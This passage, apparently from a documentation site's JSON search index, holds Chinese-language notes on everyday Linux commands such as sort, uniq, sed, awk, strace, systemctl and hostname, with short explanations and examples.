<code>.zip</code>\u6587\u4ef6\u4e0d\u4ec5\u4f7f\u7528\u4e0d\u540c\u7684\u538b\u7f29\u7b97\u6cd5\uff08\u901a\u5e38\u662fDEFLATE\uff09\uff0c\u8fd8\u652f\u6301\u6253\u5305\u548c\u538b\u7f29\u591a\u4e2a\u6587\u4ef6\u548c\u76ee\u5f55\u5230\u4e00\u4e2a\u5355\u72ec\u7684<code>.zip</code>\u6587\u4ef6\u4e2d\u3002\u8fd9\u610f\u5473\u7740<code>.zip</code>\u6587\u4ef6\u53ef\u4ee5\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u7684\u7ed3\u6784\u4fe1\u606f\uff0c\u5982\u76ee\u5f55\u548c\u6587\u4ef6\u5c5e\u6027\u3002 1. \u7528\u9014\uff1a   - <code>.gz</code>\u683c\u5f0f\u901a\u5e38\u7528\u4e8e\u538b\u7f29\u5355\u4e2a\u6587\u4ef6\u3002\u5f53\u9700\u8981\u538b\u7f29\u591a\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\u65f6\uff0c\u901a\u5e38\u4f1a\u5148\u4f7f\u7528<code>tar</code>\u547d\u4ee4\u5c06\u5b83\u4eec\u6253\u5305\u6210\u4e00\u4e2a<code>.tar</code>\u6587\u4ef6\uff0c\u7136\u540e\u518d\u4f7f\u7528<code>gzip</code>\u538b\u7f29\uff0c\u5f62\u6210<code>.tar.gz</code>\u6216<code>.tgz</code>\u6587\u4ef6\u3002   - <code>.zip</code>\u683c\u5f0f\u5219\u66f4\u52a0\u7075\u6d3b\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u4e00\u4e2a<code>.zip</code>\u6587\u4ef6\u4e2d\u538b\u7f29\u548c\u6253\u5305\u591a\u4e2a\u6587\u4ef6\u548c\u76ee\u5f55\u3002\u8fd9\u4f7f\u5f97<code>.zip</code>\u6587\u4ef6\u975e\u5e38\u9002\u5408\u8de8\u5e73\u53f0\u5171\u4eab\uff0c\u56e0\u4e3a<code>.zip</code>\u683c\u5f0f\u88ab\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u539f\u751f\u652f\u6301\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#tail","title":"tail","text":"<ul> <li><code>-n 2</code>\uff1a\u6307\u5b9a\u663e\u793a2\u884c</li> <li><code>-n +2</code>\uff1a \u6307\u4ece\u7b2c2\u884c\u5f00\u59cb</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_13","title":"\u6587\u4ef6\u6bd4\u8f83","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#comm","title":"comm","text":"<p><code>comm [-n] &lt;file1&gt; &lt;file2&gt;</code></p> <ul> <li>\u8f93\u51fa3\u5217\uff0c\u5206\u522b\u662f\uff1a\u4ec5file1\u6709\u7684\u884c\u3001\u4ec5file2\u6709\u7684\u884c\u3001file1\u548c2\u90fd\u6709\u7684\u884c</li> <li>-n\uff1an\u53ef\u4ee5\u662f1\u30012\u30013\u3002\u201c-\u201d\u53ef\u7406\u89e3\u4e3a\u51cf\u53f7\uff0c\u6307\u5b9a\u4e0d\u663e\u793a\u54ea\u4e9b\u5217\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#diff","title":"diff","text":"<p>\u8f93\u51fa\uff1a\u7528\u201c-\u201d\u8868\u793a\u4ec5file1\u6709\u7684\u884c\uff0c\u7528\u201c+\u201d\u8868\u793a\u4ec5file2\u6709\u7684\u884c\u3002</p> <p>\u4e24\u4e2a\u5e38\u7528option\uff1a</p> <ul> <li>-u\uff1aunified\u683c\u5f0f\uff0c\u7edf\u5408\u7740\u770b</li> <li>-c\uff1acontext\u683c\u5f0f\uff0c\u663e\u793a\u4e0a\u4e0b\u6587\uff0c\u8f93\u51fa\u5c31\u6bd4unified\u683c\u5f0f\u591a\u5f88\u591a\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#vimdiff","title":"vimdiff","text":"<p>\u591a\u4e2a\u6587\u4ef6\u6253\u5f00vim\u3002\u50cfwinmerge\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#locate","title":"locate","text":"<p>\u4e0efind\u4e0d\u540c\uff0cfind\u662f\u53bb\u786c\u76d8\u627e\uff0c\u800clocate\u662f\u5728<code>/var/lib/slocate/slocate.db</code>\u4e2d\u627e\uff0c\u6240\u4ee5locate\u5feb\u3002\u800c\u8fd9\u4e2a\u6570\u636e\u5e93\u4e0d\u662f\u5b9e\u65f6\u66f4\u65b0\u7684\uff0c\u624b\u52a8\u66f4\u65b0\u6570\u636e\u5e93\u547d\u4ee4\uff1a<code>updatedb</code>\uff08\u4f3c\u4e4e\u9ed8\u8ba4\u6bcf\u5929<code>cron</code>\u8dd1\u4e00\u6b21\uff09\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#file","title":"file","text":"<p>\u786e\u8ba4\u6587\u4ef6\u7c7b\u578b\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#exiftool","title":"exiftool","text":"<p>[!NOTE] EXIF: EXchangeable Image File Format</p> <p>\u8bfb\u53d6\u3001\u5199\u5165\u548c\u5904\u7406\u56fe\u50cf\u3001\u97f3\u9891\u3001\u89c6\u9891\u548cPDF \u5143\u6570\u636e\u3002</p> <p><code>exiftool -a -u brochure.pdf</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#strings","title":"strings","text":"<p>\u9690\u5199\u3001\u786e\u8ba42\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u5b57\u7b26\u4e32\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#binwalk","title":"binwalk","text":"<p>\u2022 \u53ef\u67e5\u770b\u6587\u4ef6\u6709\u65e0\u6346\u7ed1\uff1a<code>binwalk &lt;file&gt;</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#strace","title":"strace","text":"<p>\u8ffd\u8e2a2\u8fdb\u5236\u8fd0\u884c\u7684\u7cfb\u7edf\u8c03\u7528\u3002</p> <p>\u7ecf\u9a8c\uff1a</p> <ul> <li>\u5f53\u51fa\u73b0\u201cread(0,\u201d\u5e76\u5361\u4f4f\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u7b49\u5f85\u7528\u6237\u8f93\u5165</li> <li>\u91cd\u70b9\u5173\u6ce8openat\u2014\u2014\u4e0e\u6587\u4ef6\u7684\u4ea4\u4e92</li> <li>\u4f3c\u4e4e\u53ef\u4ee5\u7528<code>-e trace=open,read</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#hexeditor","title":"hexeditor","text":"<p>\u67e5\u770b16\u8fdb\u5236\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_14","title":"\u7edf\u8ba1\u76ee\u5f55\u5927\u5c0f","text":"<p><code>du -sh</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_15","title":"\u6587\u672c\u5904\u7406\u548c\u7f16\u8f91","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#echo","title":"echo","text":"<p>\u89e3\u6790[[\u7f16\u7801#\u8f6c\u4e49\u5e8f\u5217|\u8f6c\u4e49\u5e8f\u5217]]\uff1a<code>echo -e</code></p> <p>\u5982\uff1a <pre><code>$ echo -e 'hello \\nworld'\nhello \nworld\n</code></pre></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#vivim","title":"vi/vim","text":"\u8f93\u5165 \u6548\u679c <code>x</code> vim: Cut character <code>dw</code> vim: Cut word <code>dd</code> vim: Cut full line <code>yw</code> vim: Copy word <code>yy</code> vim: Copy full line <code>p</code> vim: Paste <code>:1</code> vim: Go to line number 1. <code>dd</code> \u5220\u9664\u5149\u6807\u6240\u5728\u884c <code>## dd {\u6570\u5b57}</code> \u5220\u9664\u6307\u5b9a\u884c <code>u</code> \u64a4\u56de <code>:set nu</code> \u663e\u793a\u884c\u53f7 <code>:set nonu</code> \u4e0d\u663e\u793a\u884c\u53f7 <p>\u6ce8\u91ca\u5feb\u6377\u952e</p> <ul> <li>\u5feb\u901f\u6ce8\u91ca\u4e00\u884c\uff1a\u5927\u5199\u5b57\u6bcd\"I\"\u8fdb\u5165\u884c\u9996\u63d2\u5165\u6a21\u5f0f\uff0c\u8f93\u5165\u6ce8\u91ca\u7b26\u53f7\uff08\u5982\u201c#\u201d\uff09\u3002</li> <li>\u5feb\u901f\u53d6\u6d88\u6ce8\u91ca\u4e00\u884c\uff1a\u6309\u4e0b\u5c0f\u5199\u5b57\u6bcd\u201cx\u201d\u5220\u9664\u6ce8\u91ca\u7b26\u53f7\u3002</li> <li>\u5feb\u901f\u6ce8\u91ca\u591a\u884c\uff1a\u5c06\u5149\u6807\u79fb\u52a8\u5230\u8981\u6ce8\u91ca\u7684\u7b2c\u4e00\u884c\u4e0a\uff0c\u6309\u4e0b\u5927\u5199\u5b57\u6bcd\u201cV\u201d\u8fdb\u5165\u53ef\u89c6\u884c\u6a21\u5f0f\uff0c\u79fb\u52a8\u5149\u6807\u5230\u8981\u6ce8\u91ca\u7684\u6700\u540e\u4e00\u884c\uff0c\u6309\u4e0b\u5927\u5199\u5b57\u6bcd\u201cI\u201d\u8fdb\u5165\u884c\u9996\u63d2\u5165\u6a21\u5f0f\uff0c\u8f93\u5165\u6ce8\u91ca\u7b26\u53f7\uff08\u5982\u201c#\u201d\uff09\u3002</li> <li>\u5feb\u901f\u53d6\u6d88\u6ce8\u91ca\u591a\u884c\uff1a\u5c06\u5149\u6807\u79fb\u52a8\u5230\u8981\u53d6\u6d88\u6ce8\u91ca\u7684\u7b2c\u4e00\u884c\u4e0a\uff0c\u6309\u4e0b\u5927\u5199\u5b57\u6bcd\u201cV\u201d\u8fdb\u5165\u53ef\u89c6\u884c\u6a21\u5f0f\uff0c\u79fb\u52a8\u5149\u6807\u5230\u8981\u53d6\u6d88\u6ce8\u91ca\u7684\u6700\u540e\u4e00\u884c\uff0c\u6309\u4e0b\u5c0f\u5199\u5b57\u6bcd\u201cx\u201d\u5220\u9664\u6ce8\u91ca\u7b26\u53f7\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#tee","title":"tee","text":"<p>\u547d\u540d\u6e90\u4e8e\u4e00\u79cdT\u578b\u7ba1\u9053\uff08tee\uff09\u3002\u8868\u793a\u53ef\u4ee5\u5206\u5c94\u2014\u2014\u5373\u53ef\u4ee5\u5c06\u547d\u4ee4\u7684\u6807\u51c6\u8f93\u51fa\u6d41\u4e5f\u5206\u51fa\u4e00\u90e8\u5206\u5230\u5176\u4ed6\u5730\u65b9\uff08\u5982\u6587\u4ef6\uff09\u3002</p> <ul> <li><code>tee</code>\uff1a<code>&gt;</code>\uff08\u5373\u8986\u76d6\uff09</li> <li><code>tee -a</code>\uff1a<code>&gt;&gt;</code>\uff08\u5373\u8ffd\u52a0\uff09</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#wc","title":"wc","text":"<p><code>wc</code>\u7ed3\u679c\u8f93\u51fa\u7edf\u8ba1\u76843\u4e2a\u6570\uff1a\u6587\u4ef6\u4e2d\u7684\u884c\u6570\u3001\u5355\u8bcd\u6570\u3001\u5b57\u7b26\u6570\u3002</p> <ul> <li>-l\uff1a\u884c\u6570</li> <li>-w\uff1a\u5355\u8bcd\u6570</li> <li>-c\uff1a\u5b57\u7b26\u6570</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#sort","title":"sort","text":"<p>\u6309\u7b2c5\u5217\u8fdb\u884c\u6570\u5b57\u6392\u5e8f\uff08\u964d\u5e8f\uff09\uff1a<code>sort -t= -k3,3 -nr &lt;file&gt;</code></p> <ul> <li>-t\uff1a\u5206\u9694\u7b26\u3002\u9ed8\u8ba4\u4e3a\u7a7a\u683c\uff0c\u6b64\u5904\u6307\u5b9a\u4e3a\u7b49\u53f7</li> <li>-k\uff1a\u6307\u5b9akey\uff0c\u6709\u8bb8\u591a\u5f62\u5f0f\u3002\u5728\u8fd9\u91cc\u4ee5\u6570\u5b573\u8868\u793a\u7b2c3\u5217\u5f00\u59cb\uff0c\u5230\u7b2c3\u5217\u7ed3\u675f\u3002\u5355\u5217\u7684\u8bdd\u4e5f\u53ef\u7b80\u5199\u4f5c\uff1a-k3</li> <li>-n\uff1a\u4ee5\u6570\u5b57\u6392\u5e8f</li> <li>-r\uff1a\u964d\u5e8f</li> </ul> <p>\u53bb\u91cd\uff1asort -u</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#uniq","title":"uniq","text":"<p>\u53bb\u91cd&amp;\u7edf\u8ba1\uff1a<code>uniq -c</code></p> <p>[!NOTE] \u8981\u5148sort\u4e00\u904d\u518duniq \u56e0\u4e3auniq\u662f\u6bcf\u6b21\u90fd\u68c0\u67e5\u8fde\u7eed\u7684\u884c\u7136\u540e\u53d6\u7b2c\u4e00\u884c</p> <p><code>grep \"Edg\" $logFile | awk '{ print $10 }' |\u00a0 sort -n | uniq -c | sort -rn | head</code></p> <ul> <li>-n\uff1a\u6570\u5b57\u6392\u5e8f\uff08\u4e0d\u7136\u5b57\u7b26\u6392\u5e8f\u7684\u8bdd\uff0c\u4f1a<code>[1, 11, 2, 3, ...]</code>\u8fd9\u6837\u6392\uff09</li> <li>-r\uff1a\u9006\u5e8f</li> <li>-c\uff1a\u663e\u793acount\u6570\uff08\u5373\u7edf\u8ba1\uff0c\u5426\u5219\u53ea\u662f\u53bb\u91cd\u8fd8\u4e0d\u5982\u7528<code>sort -u</code>\uff09</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#paste","title":"paste","text":"<p><code>paste -sd ','</code>\uff1a\u591a\u884c\u6570\u636e\u5408\u5e76\u4e3a\u5355\u884c\uff0c\u4ee5\u9017\u53f7\u5206\u9694</p> <ul> <li>-s\uff1a\u5c06 <code>paste</code> \u547d\u4ee4\u7684\u5904\u7406\u65b9\u5f0f\u4ece\u5e76\u884c\u6539\u4e3a\u4e32\u884c\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>paste</code> \u4f1a\u5e76\u884c\u5408\u5e76\u591a\u4e2a\u6587\u4ef6\u7684\u5bf9\u5e94\u884c\uff09\u3002\u4e32\u884c\u6a21\u5f0f\u4e0b\uff0c<code>paste</code> \u4f1a\u5c06\u5355\u4e2a\u6587\u4ef6\u7684\u6240\u6709\u884c\u5408\u5e76\u6210\u4e00\u884c</li> <li>-d\uff1a\u6307\u5b9a\u5206\u9694\u7b26</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#tr","title":"tr","text":"<p>\u66ff\u6362\u6216\u5220\u9664\u6587\u4ef6\u4e2d\u7684\u5b57\u7b26</p> <ul> <li>\u6362\u884c\u66ff\u6362\uff1a<code>tr \"\\n\" \" \"</code><ul> <li>\u53ef\u7528\u5355\u5f15\u53f7</li> </ul> </li> <li>\u5220\u9664\u56de\u8f66\u7b26\uff1a<code>tr -d \"\\r\"</code><ul> <li>\u7b49\u540c\u4e8e <code>sed \"s/^M//\"\u3001sed \"s/\\r//\"</code>\u3002\u6ce8\u610f\uff1a\u8fd9\u4e2a\u201c^M\u201d\u4e0d\u662f\u624b\u6253\u7684\uff0c\u662f<code>Ctrl+V+Ctrl+M</code>\u8f93\u5165\u7684\u201c\u56de\u8f66\u7b26\u201d</li> <li><code>-d</code>\uff1a\u5373<code>--delete</code>\uff0c\u5220\u9664\u6307\u4ee4\u5b57\u7b26\uff08\u6ce8\u610f\uff1a\u4ee5\u5b57\u7b26\u800c\u4e0d\u662f\u6574\u4e2a\u5355\u8bcd\u4e3a\u5355\u4f4d\uff09</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#cut","title":"cut","text":"<p><code>cut -d \" \" -f 4</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#sed","title":"sed","text":"<p>\u5904\u7406\u591a\u884c\u53ef\u7528cut\uff0c\u800c\u6587\u672c\u6d41\u53ef\u7528sed\u547d\u4ee4\u3002</p> <ul> <li>\u9ed8\u8ba4\u9009\u9879\uff1a<code>-e</code>\uff0c\u53ea\u8f93\u51fa\u5728\u7ec8\u7aef\uff0c\u800c\u4e0d\u6539\u53d8\u6587\u4ef6</li> <li><code>-i</code>\uff1a\u76f4\u63a5\u4fee\u6539\u6587\u4ef6\uff0c\u800c\u4e0d\u8f93\u51fa\u5728\u7ec8\u7aef</li> </ul> <p></p> <ul> <li>$\u8868\u793a\u6700\u540e\u4e00\u884c</li> <li>\u2018$aString\u2019\u8868\u793a\u6700\u540e\u4e00\u884c\u589e\u52a0\u3002\u5fc5\u987b\u7528\u5355\u5f15\u53f7\uff01\u56e0\u4e3a\u53cc\u5f15\u53f7\u4f1a\u4ee5\u4e3a\u662f\u8c03\u7528\u53d8\u91cf\uff1f<ul> <li>a\u548cString\u4e4b\u95f4\u53ef\u4ee5\u7528\u7a7a\u683c\u3001\u53cd\u659c\u6760\u3001\u6216\u8005\u4e0d\u7a7a\u3002\uff08\u53cd\u659c\u6760\u7684\u8bdd\u6ce8\u610f\u662f\u5426\u6709\u7279\u6b8a\u8f6c\u4e49\uff09</li> <li>\u8e29\u5751\uff1a\u53ef\u80fd\u6d89\u53ca\u6743\u9650\u4e0d\u591f\u95ee\u9898\uff0c\u56e0\u4e3ased\u662f\u9996\u5148\u7f16\u8f91\u597d\u4e34\u65f6\u6587\u4ef6\u7136\u540e\u7528\u4e34\u65f6\u6587\u4ef6\u66ff\u6362\u6e90\u6587\u4ef6\u3002</li> </ul> </li> </ul> <p>\u6b63\u5219 </p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#awk","title":"awk","text":"<p>\u76f8\u6bd4\u4e8esed\u5904\u7406\u4e00\u884c\u7684\u6570\u636e\u6d41\uff0cawk\u503e\u5411\u628a\u6bcf\u884c\u6309\u5b57\u6bb5\u5206\u5272\u5904\u7406\u3002\u5bf9\u683c\u5f0f\u5316\u7684\u6587\u672c\u5904\u7406\u80fd\u529b\u5f3a\u3002</p> <p>\u8be6\u7ec6\uff1aawk\u7684\u57fa\u672c\u4f7f\u7528\u65b9\u6cd5</p> <p>\u4f8b\uff1a <code>awk -F',' '{print $1,$2}'\u00a0\u00a0 log.txt</code></p> <ul> <li>\u4f7f\u7528\",\"\u5206\u5272\uff08\u9ed8\u8ba4\u7a7a\u683c\uff09</li> <li>\u5199\u6210\u4e00\u884c\u8981\u7528\u5355\u5f15\u53f7</li> </ul> <p>\u5b9e\u7528\uff08\u7b2c4\u5217\u53bb\u91cd\uff09\uff1a <code>zfgrep 'xxx/' ./*/httpaccess-vpn.log* | awk '!seen[$4]++ { print $4, $7, $8, $10 }'</code></p> <ul> <li>\u5b9a\u4e49\u4e00\u4e2aseen\u6570\u7ec4\u3002</li> <li>\u6570\u7ec4\u7684\u503c\u5982\u679c\u672a\u5b9a\u4e49\uff0c\u9ed8\u8ba4\u662f0\u2014\u2014false</li> <li>\u7136\u540e\u9012\u589e\u5c06\u503c\u52a01\u2014\u2014true</li> <li>\u7136\u540e\u611f\u53f9\u53f7\u53d6\u975e</li> <li>debug\uff1a<code>'!seen[$4]++ { print $4, $7, $8,$10; print \"seen[\"$4\"]= \", seen[$4] }'</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#pattern","title":"\u6761\u4ef6\u53ef\u7528\u3010/PATTERN/\u3011\u6b63\u5219\u5339\u914d","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#nrfnr","title":"NR\u4e0eFNR","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#ofs","title":"\u6307\u5b9a\u8f93\u51fa\u5206\u9694\u7b26\uff08OFS\uff09","text":"<p><code>\u2026 | awk -F '|' '{OFS=\":\"; print $11,$14}' | tr -d ' '</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_16","title":"\u8f6c\u5927\u5199","text":"<p><code>echo \"Hello World\" | awk '{print toupper($0)}'</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#jsonjq","title":"[[json#jq\u547d\u4ee4]]","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#xargs","title":"xargs","text":"<p>\u7406\u89e3xargs\u4e0e\u7ba1\u9053\u7b26\u7684\u533a\u522b\uff1a</p> <ul> <li><code>echo '--help' | cat</code></li> <li><code>echo '--help' | xargs cat</code></li> </ul> <p>xargs\u7684\u9ed8\u8ba4\u547d\u4ee4\u662fecho\uff0c\u8fd9\u610f\u5473\u7740\u901a\u8fc7\u7ba1\u9053\u4f20\u9012\u7ed9xargs\u7684\u8f93\u5165\u5c06\u4f1a\u5305\u542b\u6362\u884c\u548c\u7a7a\u767d\uff0c\u4e0d\u8fc7\u901a\u8fc7xargs\u7684\u5904\u7406\uff0c\u6362\u884c\u548c\u7a7a\u767d\u5c06\u88ab\u7a7a\u683c\u53d6\u4ee3\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_17","title":"\u7cfb\u7edf\u4fe1\u606f\u548c\u670d\u52a1\u7ba1\u7406","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#history","title":"history","text":"<ul> <li>\u4fdd\u5b58\u5728\u7528\u6237\u4e3b\u76ee\u5f55\u7684 <code>.bash_history</code> \u6587\u4ef6\u91cc</li> <li><code>!&lt;\u547d\u4ee4\u884c\u53f7&gt;</code>\uff1a\u6267\u884c\u76ee\u6807\u547d\u4ee4</li> </ul> <p>\u76f8\u5173\u73af\u5883\u53d8\u91cf\uff1a</p> <ul> <li><code>HISTSIZE</code>\u548c<code>HISTFILESIZE</code> \u53ef\u63a7\u5236\u5927\u5c0f</li> <li><code>HISTTIMEFORMAT</code>\uff1a\u65f6\u95f4\u6233<ul> <li>\u53ef\u7528<code>export HISTTIMEFORMAT=\"[%F %T] \"</code>\u663e\u793a\u5386\u53f2\u547d\u4ee4\u65f6\u95f4</li> <li>%F\uff1aISO8601\u683c\u5f0f</li> <li>%T\uff1a24\u5c0f\u65f6\u5236</li> <li>\u5176\u4ed6\u683c\u5f0f\u53c2\u7167strftime\u624b\u518c</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#date","title":"date","text":"<p>\u7528<code>+</code>\u6307\u5b9a\u683c\u5f0f\uff1a<code>date '+&lt;format&gt;'</code>\uff0c\u6216<code>date +'&lt;format&gt;'</code>\u3002<code>+</code>\u5b57\u7b26\u5728\u5f15\u53f7\u5185\u5916\u90fd\u53ef\uff0c\u56e0\u4e3a<code>+</code>\u5b57\u7b26\u5728\u8fd9\u91cc\u4e0d\u9700\u8981\u7279\u6b8a\u5904\u7406\uff0c\u91cd\u70b9\u662f\u52a0\u53f7\u548cformat\u4e4b\u95f4\u4e0d\u80fd\u6709\u7a7a\u683c\u3002</p> <p>\u8d4b\u503c\uff08\u547d\u4ee4\u66ff\u6362\uff09\uff1a<code>DATE=$(date +%Y%m%d)</code></p> <ul> <li><code>-d 'N days ago'</code>\uff1a\u83b7\u53d6N\u65e5\u524d\u7684\u65f6\u95f4\u3002</li> <li><code>-d 'N days'</code>\uff1a\u83b7\u53d6N\u65e5\u540e\u7684\u65f6\u95f4\u3002</li> </ul> <p>-s\uff1a\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4</p> <ul> <li>\u91cd\u542f\u7cfb\u7edf\u53ef\u4ee5\u6062\u590d</li> <li>\u5982\u679c\u914d\u7f6e\u4e86NTP\uff0c\u4f3c\u4e4e\u4f1a\u9010\u6e10\u540c\u6b65\u65f6\u95f4</li> <li>\u7acb\u5373\u5f3a\u5236\u540c\u6b65\u65f6\u95f4\uff1a<ul> <li>\u5982\u679c\u4f7f\u7528chronyd\uff1a<code>sudo systemctl restart chronyd</code></li> <li>\u5982\u679c\u4f7f\u7528ntpd\uff1a<code>sudo systemctl restart ntp</code></li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_18","title":"\u670d\u52a1\u7ba1\u7406\u5668","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#init","title":"init","text":"<ul> <li>\u65e7</li> <li>\u7528service\u7cfb\u5217\u547d\u4ee4\uff08\u662f\u5bf9<code>/etc/init.d</code>\u76ee\u5f55\u4e0b\u670d\u52a1\u811a\u672c\u7684\u5c01\u88c5\uff09</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#systemd","title":"systemd","text":"<ul> <li>\u65b0</li> <li>\u7528systemctl\u7cfb\u5217\u547d\u4ee4</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_19","title":"\u8fd0\u884c\u7ea7\u522b","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#init_1","title":"init\u65b9\u5f0f","text":"<p><code>init &lt;runlevel&gt;</code>\u547d\u4ee4\u5207\u6362\u8fd0\u884c\u7ea7\u522b</p> <ul> <li>0\uff1a\u5173\u673a</li> <li>6\uff1a\u91cd\u542f</li> <li>3\uff1a\u547d\u4ee4\u884c\u754c\u9762</li> <li>5\uff1a\u56fe\u5f62\u754c\u9762</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#systemctl","title":"systemctl\u65b9\u5f0f","text":"<p>\u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7ea7\u522b\uff08\u4e0b\u9762\u7ed3\u679c\u8868\u793a\u4ece3\u7ea7\u522b\u5207\u6362\u5230\u4e865\u7ea7\u522b\uff09 <pre><code>$ sudo runlevel\n3 5\n</code></pre></p> <p>\u67e5\u770b\u5f53\u524d\u9ed8\u8ba4\u542f\u52a8\u7ea7\u522b <pre><code>$ sudo systemctl get-default\ngraphical.target\n</code></pre></p> <p>\u8bbe\u7f6e\u9ed8\u8ba4\u7b2c3/5\u8fd0\u884c\u7ea7\u522b\uff08\u547d\u4ee4\u884c/\u56fe\u5f62\uff09 <pre><code>$ sudo systemctl set-default multi-user-target\n$ sudo systemctl set-default graphical-targete\n</code></pre></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_20","title":"\u684c\u9762\u73af\u5883","text":"<p>\u67e5\u770b</p> <ul> <li>\u53ef\u7528\u7684\uff1als /usr/share/xsessions/</li> <li>\u5f53\u524d\u7684\uff1aecho $XDG_CURRENT_DESKTOP</li> </ul> <p>\u5b89\u88c5\uff1a\u5b89\u88c5\u684c\u9762\u73af\u5883</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#systemctl_1","title":"systemctl","text":"<p>\u6ce8\u610f\uff1a\u4fee\u6539\u670d\u52a1\u5355\u5143\u6587\u4ef6\uff08\u5982\u4e0b\u9762\u7684<code>/etc/systemd/system/k3s.service</code>\uff09\u540e\uff0c\u9700\u8981\u91cd\u542fdaemon\uff1a <pre><code>$ sudo systemctl daemon-reload\n$ sudo systemctl restart k3s\n$ sudo cat /etc/systemd/system/k3s.service\n</code></pre></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_21","title":"\u66f4\u6539\u4e3b\u673a\u540d","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_22","title":"\u4e34\u65f6","text":"<p><code>hostname xxx</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_23","title":"\u6c38\u4e45","text":"<pre><code>vi /etc/hostname\nreboot\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#hostname","title":"\u67e5\u770bhostname\u8be6\u7ec6\u4fe1\u606f","text":"<p><code>hostnamectl</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#uname","title":"uname","text":"<p>\u5373unix name\u3002</p> <ul> <li><code>-a</code>\uff1a\u663e\u793a\u6240\u6709\u4fe1\u606f\uff1a\u4e3b\u673a\u540d\u3001\u5185\u6838\u7248\u672c\u3001\u786c\u4ef6\u7b49\u3002</li> 